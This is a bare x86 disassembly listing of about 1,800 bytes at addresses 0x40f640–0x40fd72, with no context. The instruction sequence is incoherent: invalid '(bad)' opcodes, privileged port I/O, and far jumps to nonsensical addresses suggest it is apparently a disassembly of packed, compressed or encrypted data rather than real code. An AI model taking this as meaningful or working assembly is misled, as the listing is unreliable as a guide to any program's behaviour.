  40f640:	dec    ebx
  40f641:	dec    edi
  40f642:	push   0x69
  40f644:	ss mov ebx,fs
  40f647:	popa   
  40f648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f649:	stos   BYTE PTR es:[edi],al
  40f64a:	mov    ebp,0x84569e74
  40f64f:	dec    edi
  40f650:	jo     0x40f67e
  40f652:	fidivr WORD PTR [esi]
  40f654:	pop    edx
  40f655:	leave  
  40f656:	adc    edi,ebx
  40f658:	or     eax,0x81e34f77
  40f65d:	jmp    0xedc0a3c6
  40f662:	mov    ebp,ecx
  40f664:	mov    bl,ch
  40f666:	ja     0x40f6b2
  40f668:	cmp    BYTE PTR [ebp-0x17b15ff4],dh
  40f66e:	sub    eax,0xdc2fac0c
  40f673:	es push edx
  40f675:	mov    ch,dh
  40f677:	mov    ds:0x70ea0ed0,eax
  40f67c:	push   0xa
  40f67e:	xchg   esp,eax
  40f67f:	cmc    
  40f680:	loopne 0x40f64a
  40f682:	repz add al,0xc0
  40f685:	mov    ch,0x1
  40f687:	xchg   edx,eax
  40f688:	pusha  
  40f689:	into   
  40f68a:	aam    0xe5
  40f68c:	sbb    al,0xe5
  40f68e:	xor    eax,0xebaf194d
  40f693:	mov    cl,0x57
  40f695:	xchg   ebp,edi
  40f697:	scas   al,BYTE PTR es:[edi]
  40f698:	and    eax,0xf216a3ac
  40f69d:	iret   
  40f69e:	es rol esi,cl
  40f6a1:	clc    
  40f6a2:	push   esi
  40f6a3:	js     0x15e95b7b
  40f6a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6aa:	cmp    BYTE PTR [eax-0x2d],bl
  40f6ad:	loop   0x40f6f2
  40f6af:	lds    edi,FWORD PTR [esi]
  40f6b1:	nop
  40f6b2:	int3   
  40f6b3:	popa   
  40f6b4:	inc    eax
  40f6b5:	add    DWORD PTR [ebx],esi
  40f6b7:	loope  0x40f697
  40f6b9:	aad    0x1e
  40f6bb:	add    BYTE PTR [edi],cl
  40f6bd:	pop    esi
  40f6be:	addr16 mov cl,0x65
  40f6c1:	xor    esp,eax
  40f6c3:	enter  0xbc69,0x42
  40f6c7:	jnp    0x40f665
  40f6c9:	mov    al,ds:0x8d3a9799
  40f6ce:	sahf   
  40f6cf:	fisttp WORD PTR [ebx+0x2d]
  40f6d2:	in     eax,0x53
  40f6d4:	sbb    ebp,DWORD PTR [esi+ecx*2-0x1d7f5811]
  40f6db:	jecxz  0x40f741
  40f6dd:	inc    esp
  40f6de:	xchg   cx,ax
  40f6e0:	das    
  40f6e1:	cld    
  40f6e2:	lods   al,BYTE PTR ds:[esi]
  40f6e3:	nop
  40f6e4:	pusha  
  40f6e5:	jmp    0x728a2819
  40f6ea:	xchg   DWORD PTR [edx+0x4680dc79],edx
  40f6f0:	int    0xd5
  40f6f2:	jne    0x40f72d
  40f6f4:	pop    ebp
  40f6f5:	or     edx,esi
  40f6f7:	xchg   esi,eax
  40f6f8:	dec    edi
  40f6f9:	jne    0x40f698
  40f6fb:	add    eax,0xba64e66f
  40f700:	jl     0x40f698
  40f702:	shl    DWORD PTR [ecx+0x64],0x79
  40f706:	push   ds
  40f707:	dec    ebx
  40f708:	push   eax
  40f709:	test   ah,0xbb
  40f70c:	stos   BYTE PTR es:[edi],al
  40f70d:	fwait
  40f70e:	call   0x98f3:0xfb541798
  40f715:	cmp    BYTE PTR ds:0xd350f549,al
  40f71b:	jae    0x40f6d6
  40f71d:	scas   eax,DWORD PTR es:[edi]
  40f71e:	fsubr  DWORD PTR [eax]
  40f720:	mov    esi,DWORD PTR [ecx]
  40f722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f723:	cwde   
  40f724:	stos   DWORD PTR es:[edi],eax
  40f725:	mov    ebp,0x5edc12c2
  40f72a:	shr    BYTE PTR [ecx+0x48],0x51
  40f72e:	fwait
  40f72f:	or     al,0x96
  40f731:	dec    ebp
  40f732:	adc    edi,DWORD PTR [esi]
  40f734:	icebp  
  40f735:	adc    edi,DWORD PTR [ebp+0x4c]
  40f738:	iret   
  40f739:	cmp    edx,DWORD PTR [edx+0x5b498316]
  40f73f:	std    
  40f740:	push   ds
  40f741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f742:	jno    0x40f754
  40f744:	pop    ebp
  40f745:	jle    0x40f6e5
  40f747:	lods   al,BYTE PTR ds:[esi]
  40f748:	jbe    0x40f754
  40f74a:	or     BYTE PTR [edi],ch
  40f74c:	xchg   BYTE PTR [eax],bl
  40f74e:	xor    ecx,DWORD PTR [edi]
  40f750:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f751:	stos   DWORD PTR es:[edi],eax
  40f752:	(bad)  
  40f754:	(bad)  
  40f755:	sub    DWORD PTR [ecx+0x772c219e],ebx
  40f75b:	or     al,0x7
  40f75d:	cwde   
  40f75e:	jmp    0x150a:0x9f08b682
  40f765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f766:	ret    0x6903
  40f769:	push   ds
  40f76a:	xor    ch,BYTE PTR [esi-0x8362b04]
  40f770:	packssdw mm7,QWORD PTR [edi+0x2563841d]
  40f777:	push   edi
  40f778:	xchg   esp,eax
  40f779:	push   esp
  40f77a:	sbb    ebp,DWORD PTR [ebx-0x628bf3d9]
  40f780:	or     bl,BYTE PTR [edx]
  40f782:	imul   ecx,DWORD PTR [edx+0x39],0xffffffdd
  40f786:	add    al,0x0
  40f788:	fstp   QWORD PTR [ebp+0x15]
  40f78b:	inc    ebx
  40f78c:	gs jl  0x40f72f
  40f78f:	push   0xec2e9c55
  40f794:	stos   DWORD PTR es:[edi],eax
  40f795:	imul   edx,DWORD PTR [ebx+0x1a0fb50e],0xffffffdc
  40f79c:	mov    ecx,0xba9663de
  40f7a1:	mov    ds:0xc9527d6e,eax
  40f7a6:	and    dl,BYTE PTR [ecx+eiz*2-0x52]
  40f7aa:	sbb    bl,BYTE PTR [eax-0x37cfdc11]
  40f7b0:	add    DWORD PTR [ecx],esp
  40f7b2:	aam    0x8e
  40f7b4:	sub    edx,DWORD PTR [ebx+0x440fe286]
  40f7ba:	ret    
  40f7bb:	outs   dx,DWORD PTR ds:[esi]
  40f7bc:	in     al,dx
  40f7bd:	jne    0x40f75e
  40f7bf:	lock fwait
  40f7c1:	xor    DWORD PTR [ecx],ecx
  40f7c3:	cmp    DWORD PTR [esi+0x14812435],edx
  40f7c9:	xchg   ebp,edi
  40f7cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7cc:	push   ss
  40f7cd:	adc    BYTE PTR [ebp+0x23f9d660],dh
  40f7d3:	fld    DWORD PTR [edx]
  40f7d5:	arpl   WORD PTR [esi+eax*1-0x1d648d1c],dx
  40f7dc:	push   esp
  40f7dd:	(bad)  
  40f7de:	push   ds
  40f7df:	add    ah,BYTE PTR [esi]
  40f7e1:	dec    ebp
  40f7e2:	sub    eax,0x61caed9d
  40f7e7:	mov    ebx,0x7aa84961
  40f7ec:	jb     0x40f7bf
  40f7ee:	stos   BYTE PTR es:[edi],al
  40f7ef:	in     eax,dx
  40f7f0:	ss mov ebp,es
  40f7f3:	loopne 0x40f7e9
  40f7f5:	mov    al,0x17
  40f7f7:	(bad)  
  40f7f8:	push   ss
  40f7f9:	xlat   BYTE PTR ds:[ebx]
  40f7fa:	cmp    eax,0x3a4de947
  40f7ff:	jmp    0xd1a354ee
  40f804:	lods   eax,DWORD PTR ds:[esi]
  40f805:	mov    edi,0x464f54d0
  40f80a:	mov    ds:0x290f218c,eax
  40f80f:	pusha  
  40f810:	sub    DWORD PTR [edx-0x52],edx
  40f813:	cwde   
  40f814:	and    dl,dl
  40f816:	jp     0x40f869
  40f818:	fcmovbe st,st(3)
  40f81a:	mov    ?,WORD PTR [edx-0x5b]
  40f81d:	popa   
  40f81e:	xor    al,0x24
  40f820:	das    
  40f821:	jmp    0xfad1e639
  40f826:	js     0x40f7af
  40f828:	je     0x40f7e4
  40f82a:	sbb    eax,0x205b311f
  40f82f:	xor    eax,0x256258f7
  40f834:	ror    DWORD PTR [esi+eiz*8+0x5cef35e1],cl
  40f83b:	loope  0x40f89d
  40f83d:	and    BYTE PTR [ebx+ecx*8+0x9],0xb1
  40f842:	xor    al,0xd0
  40f844:	push   ebx
  40f845:	and    DWORD PTR [esi+ebx*8],eax
  40f848:	xor    BYTE PTR [ebx-0x13],bl
  40f84b:	sbb    eax,0xea9c5ef0
  40f850:	cmp    eax,0x58edca8e
  40f855:	shl    DWORD PTR [ecx+0x1d],1
  40f858:	inc    ebp
  40f859:	dec    edx
  40f85a:	jle    0x40f862
  40f85c:	mov    bh,0x15
  40f85e:	popf   
  40f85f:	jmp    0xcc3:0xb3e406a
  40f866:	fwait
  40f867:	lea    esp,[edi-0x71]
  40f86a:	outs   dx,BYTE PTR ds:[esi]
  40f86b:	scas   eax,DWORD PTR es:[edi]
  40f86c:	loope  0x40f819
  40f86e:	push   ss
  40f86f:	sub    eax,0x2ac364b5
  40f874:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f875:	mov    dh,0x58
  40f877:	lock aad 0xb
  40f87a:	pop    es
  40f87b:	xchg   ebx,eax
  40f87c:	push   0xfffffff0
  40f87e:	xor    ebx,edx
  40f880:	mov    dh,0xe7
  40f882:	cmp    DWORD PTR [ecx-0x60],esi
  40f885:	jne    0x40f8e3
  40f887:	sbb    DWORD PTR [ecx],edx
  40f889:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f88b:	ins    BYTE PTR es:[edi],dx
  40f88c:	jmp    0x4504:0x30300007
  40f893:	clc    
  40f894:	daa    
  40f895:	fyl2x  
  40f897:	stc    
  40f898:	and    al,0x5b
  40f89a:	xchg   ebx,eax
  40f89b:	sub    DWORD PTR [ecx],eax
  40f89d:	dec    ebx
  40f89e:	mov    WORD PTR [eax],cs
  40f8a0:	enter  0x157f,0xad
  40f8a4:	stos   BYTE PTR es:[edi],al
  40f8a5:	sahf   
  40f8a6:	mov    ebx,0x920f757a
  40f8ab:	aad    0xdc
  40f8ad:	inc    edi
  40f8ae:	mov    esi,0xbd464050
  40f8b3:	lods   al,BYTE PTR ds:[esi]
  40f8b4:	dec    ebp
  40f8b5:	xor    al,0x8c
  40f8b7:	sbb    cl,BYTE PTR [eax-0x69]
  40f8ba:	scas   eax,DWORD PTR es:[edi]
  40f8bb:	das    
  40f8bc:	inc    edx
  40f8bd:	(bad)  [ecx-0x3945699f]
  40f8c3:	jle    0x40f917
  40f8c5:	pop    es
  40f8c6:	dec    ebp
  40f8c7:	or     ecx,esp
  40f8c9:	mov    WORD PTR [eax+0x36e32db3],cs
  40f8cf:	dec    ecx
  40f8d0:	popa   
  40f8d1:	mov    cl,0x7b
  40f8d3:	xlat   BYTE PTR ds:[ebx]
  40f8d4:	jns    0x40f895
  40f8d6:	or     al,0x95
  40f8d8:	call   0x3a0:0x6f281680
  40f8df:	mov    ah,0x15
  40f8e1:	scas   eax,DWORD PTR es:[edi]
  40f8e2:	leave  
  40f8e3:	call   DWORD PTR [ebx+0x3f849a35]
  40f8e9:	mov    ebx,0x2eee4cd8
  40f8ee:	inc    ecx
  40f8ef:	in     al,dx
  40f8f0:	jae    0x40f940
  40f8f2:	jmp    0xb9cc:0xe309ef9c
  40f8f9:	mov    eax,0xe1cdce9b
  40f8fe:	push   eax
  40f8ff:	jno    0x40f947
  40f901:	retf   0xafdf
  40f904:	aaa    
  40f905:	stc    
  40f906:	loop   0x40f89b
  40f908:	push   ss
  40f909:	loop   0x40f8f1
  40f90b:	pop    ebx
  40f90c:	or     BYTE PTR [ebx],dl
  40f90e:	(bad)  
  40f90f:	in     al,0x17
  40f911:	jmp    0x309f2a4c
  40f916:	lds    eax,FWORD PTR [ebx+0xa]
  40f919:	adc    DWORD PTR [esi],eax
  40f91b:	xor    bh,dl
  40f91d:	push   eax
  40f91e:	sub    bl,bh
  40f920:	into   
  40f921:	cli    
  40f922:	mov    esi,DWORD PTR [esi-0x58]
  40f925:	sar    edi,0xda
  40f928:	and    DWORD PTR [eax-0x5ef0005f],0xfbec027f
  40f932:	test   DWORD PTR [ecx-0x4bff8ff4],0x9b34712d
  40f93c:	dec    ecx
  40f93d:	ja     0x40f981
  40f93f:	clc    
  40f940:	mov    esi,0x73ee5c6f
  40f945:	aaa    
  40f946:	xchg   BYTE PTR [eax-0x21],al
  40f949:	aas    
  40f94a:	outs   dx,DWORD PTR ds:[esi]
  40f94b:	pushf  
  40f94c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f94d:	push   edx
  40f94e:	loope  0x40f8f9
  40f950:	stos   DWORD PTR es:[edi],eax
  40f951:	lahf   
  40f952:	scas   al,BYTE PTR es:[edi]
  40f953:	xchg   esp,eax
  40f954:	add    BYTE PTR [ebx],0x8
  40f957:	jnp    0x40f912
  40f959:	jg     0x40f99a
  40f95b:	dec    ebx
  40f95c:	mov    cl,0x98
  40f95e:	push   esi
  40f95f:	repz cmp ecx,DWORD PTR [ebp-0x38]
  40f963:	scas   al,BYTE PTR es:[edi]
  40f964:	stc    
  40f965:	xchg   ecx,eax
  40f966:	dec    esp
  40f967:	mov    esp,ecx
  40f969:	adc    ch,BYTE PTR [ecx+0x5841118e]
  40f96f:	ss cmp eax,0x8f59059e
  40f975:	and    ah,0x62
  40f978:	mov    ebx,0x62498dee
  40f97d:	adc    al,0x35
  40f97f:	or     al,0x3e
  40f981:	sbb    al,0x47
  40f983:	mov    ds:0xbe25c3d3,al
  40f988:	jo     0x40f91d
  40f98a:	pop    eax
  40f98b:	adc    edx,ecx
  40f98d:	out    0x12,eax
  40f98f:	ds pop esp
  40f991:	ret    0xbe5e
  40f994:	aad    0x7a
  40f996:	(bad)  [ecx+0x354fb5a1]
  40f99c:	add    edi,DWORD PTR [ecx+0x45]
  40f99f:	adc    al,0x6a
  40f9a1:	inc    edi
  40f9a2:	enter  0x106b,0xa6
  40f9a6:	mov    ah,0x9d
  40f9a8:	pop    ebx
  40f9a9:	test   DWORD PTR [ecx-0x74],edx
  40f9ac:	out    0x13,eax
  40f9ae:	xchg   edi,eax
  40f9af:	stos   DWORD PTR es:[edi],eax
  40f9b0:	dec    edx
  40f9b1:	test   eax,0x67ac5862
  40f9b6:	shr    BYTE PTR [esi-0x3bdb52e2],1
  40f9bc:	cmp    bl,ch
  40f9be:	popf   
  40f9bf:	mov    eax,ds:0x435e091e
  40f9c4:	in     eax,dx
  40f9c5:	dec    edi
  40f9c6:	push   cs
  40f9c7:	dec    edi
  40f9c8:	mov    esi,0x2bb4a72f
  40f9cd:	add    ebx,DWORD PTR [ecx-0x724175ad]
  40f9d3:	and    al,0xf4
  40f9d5:	adc    eax,0x2b6b0bbc
  40f9da:	das    
  40f9db:	mov    ch,0x52
  40f9dd:	test   BYTE PTR [ebp+0x55ff393e],bh
  40f9e3:	or     al,0xda
  40f9e5:	cmp    DWORD PTR [eax],ecx
  40f9e7:	(bad)
  40f9ea:	push   0xfbb445f4
  40f9ef:	pop    es
  40f9f0:	dec    eax
  40f9f1:	into   
  40f9f2:	fs adc dh,bl
  40f9f5:	fwait
  40f9f6:	inc    ecx
  40f9f7:	mov    ds:0x540fe893,eax
  40f9fc:	adc    DWORD PTR [ebx+eiz*1],eax
  40f9ff:	jno    0x40f9cd
  40fa01:	out    dx,eax
  40fa02:	fidivr WORD PTR [ecx+0x2c6a97b8]
  40fa08:	adc    DWORD PTR [ebp+eiz*8-0x221ae18b],ecx
  40fa0f:	pop    ecx
  40fa10:	dec    ebp
  40fa11:	or     BYTE PTR [edx-0x4d],cl
  40fa14:	and    ah,BYTE PTR [edi]
  40fa16:	add    ebp,ebp
  40fa18:	sbb    al,0x84
  40fa1a:	ja     0x40fa01
  40fa1c:	push   edx
  40fa1d:	(bad)  
  40fa1e:	cmc    
  40fa1f:	add    esp,ebx
  40fa21:	hlt    
  40fa22:	and    DWORD PTR [edi-0x5cfec4bf],0xffffffb8
  40fa29:	mov    dl,0x19
  40fa2b:	mov    eax,ds:0x5a418ee7
  40fa30:	call   0x4a1d:0x36ac399
  40fa37:	jnp    0x40fa0e
  40fa39:	or     eax,0xd5109b1e
  40fa3e:	aam    0xcd
  40fa40:	test   al,0xcd
  40fa42:	dec    esi
  40fa43:	cmp    al,0xb8
  40fa45:	inc    BYTE PTR [ecx-0x3592caa3]
  40fa4b:	les    edx,FWORD PTR [ecx-0x4b38299a]
  40fa51:	test   dh,cl
  40fa53:	sbb    al,0xd4
  40fa55:	mov    esp,0x243ec4bf
  40fa5a:	jmp    0x40fa7d
  40fa5c:	inc    edx
  40fa5d:	shl    DWORD PTR [ebx+0x3b],1
  40fa60:	pop    es
  40fa61:	sub    bh,ch
  40fa63:	dec    ebx
  40fa64:	lahf   
  40fa65:	push   es
  40fa66:	leave  
  40fa67:	loop   0x40fa38
  40fa69:	adc    dl,bh
  40fa6b:	mov    ah,0xc8
  40fa6d:	cmp    eax,0x812a2b53
  40fa72:	bound  ebp,QWORD PTR [edi+0x78]
  40fa75:	xor    DWORD PTR [ebx+esi*4],ebp
  40fa78:	scas   eax,DWORD PTR es:[edi]
  40fa79:	aam    0x50
  40fa7b:	dec    edx
  40fa7c:	and    edi,DWORD PTR [ebx-0x2cd07d6d]
  40fa82:	add    ax,0xb62b
  40fa86:	int    0x8e
  40fa88:	repnz clc 
  40fa8a:	sub    eax,0xa8c41c86
  40fa90:	dec    edi
  40fa91:	scas   eax,DWORD PTR es:[edi]
  40fa92:	stc    
  40fa93:	shr    DWORD PTR [eax+0x12f3df16],1
  40fa99:	push   ds
  40fa9a:	xor    BYTE PTR [eax+edi*1],0x5c
  40fa9e:	push   ecx
  40fa9f:	xor    ebp,DWORD PTR ds:0x7c1a3318
  40faa5:	mov    ebp,0x8eee9f70
  40faaa:	push   eax
  40faab:	loopne 0x40fb01
  40faad:	or     DWORD PTR [esi-0x643e6cef],edi
  40fab3:	cmp    al,0x82
  40fab5:	ret    0x5331
  40fab8:	push   0x82d376f0
  40fabd:	sbb    dl,bl
  40fabf:	inc    eax
  40fac0:	test   DWORD PTR [edx+0x5c],esi
  40fac3:	loop   0x40fab1
  40fac5:	das    
  40fac6:	xor    ebp,DWORD PTR [edx+0x29]
  40fac9:	retf   0x866e
  40facc:	idiv   ebp
  40face:	and    dl,BYTE PTR [ebx+0x3cef14cb]
  40fad4:	mov    edx,0x9ff26fdb
  40fad9:	aas    
  40fada:	mov    es,WORD PTR [esi+ebx*2+0x46]
  40fade:	fcomp  QWORD PTR gs:[ebp+0x454f7337]
  40fae5:	jg     0x40fa94
  40fae7:	stos   DWORD PTR es:[edi],eax
  40fae8:	pop    ds
  40fae9:	loop   0x40fb16
  40faeb:	(bad)  
  40faec:	cwde   
  40faed:	iret   
  40faee:	(bad)  
  40faf0:	cmp    al,0xa0
  40faf2:	je     0x40fb14
  40faf4:	stos   BYTE PTR es:[edi],al
  40faf5:	push   ebx
  40faf6:	jnp    0x40fa8d
  40faf8:	ss ss add ecx,edi
  40fafc:	pop    ecx
  40fafd:	out    dx,eax
  40fafe:	mov    eax,0xa84e585
  40fb03:	mov    cl,0x0
  40fb05:	xor    al,0x84
  40fb07:	cld    
  40fb08:	xor    BYTE PTR [ebp-0x11],al
  40fb0b:	test   ebx,0x8a6a4e5
  40fb11:	(bad)  
  40fb12:	sub    dh,BYTE PTR [ebp-0x72]
  40fb15:	mov    DWORD PTR [esi+0x5772ea72],eax
  40fb1b:	setg   BYTE PTR [edi+0x7b]
  40fb1f:	sub    al,al
  40fb21:	inc    ebp
  40fb22:	push   esp
  40fb23:	leave  
  40fb24:	call   0xa7ecf98c
  40fb29:	inc    edi
  40fb2a:	dec    edi
  40fb2b:	push   es
  40fb2c:	bound  edi,QWORD PTR [edx-0x1c]
  40fb2f:	xor    al,0x9d
  40fb31:	xchg   ebp,edi
  40fb33:	scas   al,BYTE PTR es:[edi]
  40fb34:	ins    DWORD PTR es:[edi],dx
  40fb35:	arpl   WORD PTR [ecx+edx*8-0x10],sp
  40fb39:	scas   eax,DWORD PTR es:[edi]
  40fb3a:	addr16 icebp 
  40fb3c:	nop
  40fb3d:	popf   
  40fb3e:	das    
  40fb3f:	dec    edx
  40fb40:	dec    ebp
  40fb41:	into   
  40fb42:	pop    edx
  40fb43:	hlt    
  40fb44:	ficom  WORD PTR [edx]
  40fb46:	pop    ebp
  40fb47:	sbb    BYTE PTR [edx-0x10836dec],ch
  40fb4d:	fst    DWORD PTR [eax+0x746401c7]
  40fb53:	cwde   
  40fb54:	fs pop ecx
  40fb56:	jmp    0x972ab464
  40fb5b:	push   ss
  40fb5c:	sub    BYTE PTR [ecx-0x1],ah
  40fb5f:	stos   BYTE PTR es:[edi],al
  40fb60:	int3   
  40fb61:	inc    esi
  40fb62:	fwait
  40fb63:	mov    edx,0xb59421c6
  40fb68:	popa   
  40fb69:	lock dec esp
  40fb6b:	sahf   
  40fb6c:	(bad)  
  40fb6d:	(bad)  
  40fb6f:	hlt    
  40fb70:	dec    ebx
  40fb71:	jmp    0xb543:0x867a14ec
  40fb78:	xchg   ebx,eax
  40fb79:	pop    ds
  40fb7a:	jo     0x40fbc5
  40fb7c:	jl     0x40fba4
  40fb7e:	dec    edi
  40fb7f:	push   eax
  40fb80:	xchg   ebx,eax
  40fb81:	retf   0x6f7c
  40fb84:	mov    DWORD PTR [edi-0x2a],ebx
  40fb87:	shr    DWORD PTR [edi],cl
  40fb89:	int    0x63
  40fb8b:	push   ss
  40fb8c:	jmp    DWORD PTR [ebp-0x5a]
  40fb8f:	add    ch,BYTE PTR ds:[eax-0x73]
  40fb93:	sub    ch,ah
  40fb95:	or     eax,0x119fccaa
  40fb9a:	ja     0x40fb36
  40fb9c:	ins    BYTE PTR es:[edi],dx
  40fb9d:	xchg   edi,eax
  40fb9e:	and    eax,0xe70f6b50
  40fba3:	test   al,0xad
  40fba5:	mov    cs,esi
  40fba7:	popa   
  40fba8:	pop    eax
  40fba9:	pop    ebx
  40fbaa:	sub    al,0x5f
  40fbac:	(bad)  
  40fbad:	cmp    ebx,DWORD PTR [ecx]
  40fbaf:	mov    es,WORD PTR [edi+edx*2-0x1f0b068b]
  40fbb6:	fst    DWORD PTR [eax]
  40fbb8:	xchg   esp,eax
  40fbb9:	sahf   
  40fbba:	push   ebp
  40fbbb:	rol    DWORD PTR [eax],0xcd
  40fbbe:	loop   0x40fb87
  40fbc0:	pusha  
  40fbc1:	js     0x40fb46
  40fbc3:	dec    ax
  40fbc5:	or     al,0x4c
  40fbc7:	pop    ds
  40fbc8:	dec    edx
  40fbc9:	sub    al,0x7d
  40fbcb:	cli    
  40fbcc:	lods   al,BYTE PTR ds:[esi]
  40fbcd:	enter  0x7842,0x1
  40fbd1:	jno    0x40fc3e
  40fbd3:	inc    esi
  40fbd4:	mov    dl,BYTE PTR [edx-0x7cf83dc0]
  40fbda:	outs   dx,DWORD PTR ds:[esi]
  40fbdb:	mov    al,ds:0x28b31a9a
  40fbe0:	(bad)  
  40fbe1:	and    edx,eax
  40fbe3:	mov    eax,ds:0x97cd303d
  40fbe8:	dec    ebp
  40fbe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbea:	cmp    eax,0x9e28a890
  40fbef:	les    edx,FWORD PTR [ebp-0x4c4571af]
  40fbf5:	rcl    DWORD PTR [edx-0x61],0xc
  40fbf9:	loop   0x40fbab
  40fbfb:	lods   al,BYTE PTR ds:[esi]
  40fbfc:	jo     0x40fb88
  40fbfe:	mov    bl,0x8a
  40fc00:	(bad)  
  40fc01:	rcl    BYTE PTR [edi+0x60],0x9a
  40fc05:	pusha  
  40fc06:	stc    
  40fc07:	cld    
  40fc08:	lods   eax,DWORD PTR ds:[esi]
  40fc09:	push   esi
  40fc0a:	je     0x40fc83
  40fc0c:	adc    BYTE PTR [edx],bh
  40fc0e:	cmp    eax,0x609e1682
  40fc13:	sbb    BYTE PTR [ecx-0x28597f0a],cl
  40fc19:	adc    al,0xee
  40fc1b:	test   eax,0xfc7ab944
  40fc20:	and    eax,0x2d38c3ae
  40fc25:	nop
  40fc26:	pop    esi
  40fc27:	ins    DWORD PTR es:[edi],dx
  40fc28:	push   0x95ed394e
  40fc2d:	pusha  
  40fc2e:	test   al,0xee
  40fc30:	bound  esp,QWORD PTR [edx]
  40fc32:	ja     0x40fc41
  40fc34:	pop    edx
  40fc35:	add    ebp,DWORD PTR [ebx+ebp*4-0xd5c8df5]
  40fc3c:	and    eax,0x3858bbf4
  40fc41:	(bad)  
  40fc42:	mov    ?,WORD PTR [edi+edx*2+0x48]
  40fc46:	add    DWORD PTR [ebx-0x35],esi
  40fc49:	cli    
  40fc4a:	mov    BYTE PTR [edi+ebp*1+0x5e],al
  40fc4e:	stos   BYTE PTR es:[edi],al
  40fc4f:	es int3 
  40fc51:	hlt    
  40fc52:	sub    eax,0x9af1a955
  40fc57:	test   DWORD PTR [edx+eiz*2+0x36],0x9848e77b
  40fc5f:	mov    edx,0xb341ceb2
  40fc64:	push   eax
  40fc65:	jb     0x40fc19
  40fc67:	pop    ss
  40fc68:	jg     0x40fc62
  40fc6a:	lds    ecx,FWORD PTR [edi]
  40fc6c:	lea    eax,[ebp-0x5155fb11]
  40fc72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc73:	inc    ebx
  40fc74:	repz pop ss
  40fc76:	arpl   di,cx
  40fc78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc79:	sbb    DWORD PTR [eax],0xffffffdd
  40fc7c:	shl    bl,1
  40fc7e:	ret    
  40fc7f:	je     0x40fcc5
  40fc81:	or     bl,BYTE PTR [esi+0x77ed333d]
  40fc87:	jecxz  0x40fc69
  40fc89:	mov    ds:0x6c33ebbc,eax
  40fc8e:	sub    esi,esi
  40fc90:	pop    ss
  40fc91:	sbb    esp,edx
  40fc93:	jae    0x40fc9f
  40fc95:	xchg   esi,eax
  40fc96:	xchg   DWORD PTR cs:[eax-0x30642a54],edx
  40fc9d:	aas    
  40fc9e:	sub    ah,BYTE PTR [ebx]
  40fca0:	sbb    eax,0x77931048
  40fca5:	cmc    
  40fca6:	adc    al,0x90
  40fca8:	pop    ebx
  40fca9:	dec    ebp
  40fcaa:	pusha  
  40fcab:	or     BYTE PTR ds:0x7d9ad95b,0x0
  40fcb2:	out    0x37,eax
  40fcb4:	leave  
  40fcb5:	fcomi  st,st(7)
  40fcb7:	adc    al,0xab
  40fcb9:	aad    0xbe
  40fcbb:	dec    ebx
  40fcbc:	and    al,0xff
  40fcbe:	ficom  WORD PTR [edx+edi*4+0x7c]
  40fcc2:	iret   
  40fcc3:	xchg   DWORD PTR [ebp-0x2a7572bc],ebp
  40fcc9:	jne    0x40fd29
  40fccb:	sub    ebx,DWORD PTR [ebx-0x5f]
  40fcce:	inc    ecx
  40fccf:	shl    edx,cl
  40fcd1:	popf   
  40fcd2:	stos   BYTE PTR es:[edi],al
  40fcd3:	push   es
  40fcd4:	out    dx,al
  40fcd5:	xchg   esp,eax
  40fcd6:	sub    eax,0x4f55172
  40fcdb:	xchg   DWORD PTR [edi-0x75],ebx
  40fcde:	or     al,0x90
  40fce0:	pusha  
  40fce1:	sub    eax,0xc4a960d1
  40fce6:	xchg   BYTE PTR [ebx-0x33],bl
  40fce9:	mov    eax,0xc1dc97fe
  40fcee:	adc    BYTE PTR [ecx],0x8
  40fcf1:	rcl    eax,1
  40fcf3:	(bad)  
  40fcf4:	ins    DWORD PTR es:[edi],dx
  40fcf5:	ins    BYTE PTR es:[edi],dx
  40fcf6:	pop    esi
  40fcf7:	fadd   DWORD PTR cs:[esi+0x4a2b22c1]
  40fcfe:	and    al,0xc7
  40fd00:	loope  0x40fcbc
  40fd02:	cli    
  40fd03:	out    dx,eax
  40fd04:	daa    
  40fd05:	cmc    
  40fd06:	scas   al,BYTE PTR es:[edi]
  40fd07:	push   ds
  40fd08:	sub    BYTE PTR ds:0xe489116f,dh
  40fd0e:	mov    ch,0xbe
  40fd10:	inc    edi
  40fd11:	jb     0x40fd8d
  40fd13:	loop   0x40fd5a
  40fd15:	push   edi
  40fd16:	sub    al,0x60
  40fd18:	test   al,0xbb
  40fd1a:	cmp    edi,DWORD PTR [esi]
  40fd1c:	lock inc DWORD PTR [esi+0x63]
  40fd20:	cmp    ch,BYTE PTR [eax+0x42]
  40fd23:	xchg   edi,eax
  40fd24:	pop    ebx
  40fd25:	outs   dx,BYTE PTR ds:[esi]
  40fd26:	dec    esi
  40fd27:	sbb    BYTE PTR [esi],cl
  40fd29:	and    al,0x7a
  40fd2b:	sbb    bl,BYTE PTR [ecx]
  40fd2d:	xchg   esp,eax
  40fd2e:	ins    DWORD PTR es:[edi],dx
  40fd2f:	sub    bh,BYTE PTR [ecx+edx*2+0x4477cffb]
  40fd36:	les    edi,FWORD PTR [ebp+0x6657f54]
  40fd3c:	loopne 0x40fd77
  40fd3e:	jmp    0x37d1:0xd93caccb
  40fd45:	xchg   ebx,eax
  40fd46:	add    eax,0x9621af8e
  40fd4b:	or     ch,dh
  40fd4d:	stos   BYTE PTR es:[edi],al
  40fd4e:	ret    
  40fd4f:	cmp    eax,0x851afe4d
  40fd54:	xor    edx,esi
  40fd56:	xor    DWORD PTR [eax],ebx
  40fd58:	jbe    0x40fdc0
  40fd5a:	push   edx
  40fd5b:	fnstcw WORD PTR [ecx-0x46d14a02]
  40fd61:	dec    edx
  40fd62:	or     ebp,DWORD PTR gs:[esi]
  40fd65:	mov    bl,0xb5
  40fd67:	out    0xe0,al
  40fd69:	cdq    
  40fd6a:	scas   eax,DWORD PTR es:[edi]
  40fd6b:	add    DWORD PTR [edx+eiz*4-0x656c5380],esp
  40fd72:	push   esi
